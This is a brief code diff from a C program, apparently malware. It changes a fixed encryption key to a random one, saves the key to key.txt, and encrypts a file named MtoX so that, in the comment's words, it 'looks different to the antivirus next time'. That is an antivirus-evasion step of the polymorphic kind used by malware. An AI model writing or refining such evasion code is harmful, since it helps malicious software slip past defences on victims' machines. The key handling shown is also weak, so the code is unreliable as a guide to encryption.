@@ -32,7 +32,11 @@ int main(int argc, char*argv[]) {
 		Encrypt File 
 	*/
 	// Generate a new key and put it in the file key.txt
-	key = 8; // TODO randomize
+	key = rand() % 100 + 1; 
+	
+	fp = fopen("key.txt","w");
+	fprintf (fp, "%d", key); 
+	fclose(fp);
 
 	// Encrypt the file MtoX using the key so it looks different to the antivirus next time
 	encryptFile(key);
